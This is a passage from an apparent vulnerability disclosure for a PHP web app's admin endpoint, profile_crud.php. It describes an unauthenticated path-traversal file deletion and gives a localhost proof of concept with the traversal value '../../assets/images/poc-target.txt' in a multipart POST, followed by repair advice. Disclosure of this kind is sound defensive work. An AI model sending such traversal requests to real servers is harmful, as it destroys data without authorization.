No session check guards the endpoint (nor sidebar/header includes), the old-image filename is concatenated raw, and ../ sequences traverse out of the images directory. ## Impact

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

Local instance 127.0.0.1:8162, no cookies:

```
1. create canary file  assets/images/poc-target.txt
2. multipart POST /admin/app/profile_crud.php
   fields: update=1; image=<png bytes>; old_cat_img=../../assets/images/poc-target.txt; ...
   -> HTTP 200
3. canary file gone (os.path.exists -> False)   = unauthenticated deletion via traversal
```

Transcript: poc/F2-unauth-file-delete.txt (reproduce: python -I scripts/_church_poc.py, 127.0.0.1 only).

# Suggested repair

1. Delete stored images by database-mapped filename only; never by client-supplied path. Validate with basename() + whitelist and realpath() prefix containment.
2. Terminate unauthenticated flows with exit after any redirect; guard admin endpoints centrally.
3. Use bound parameters in the UPDATE statement.
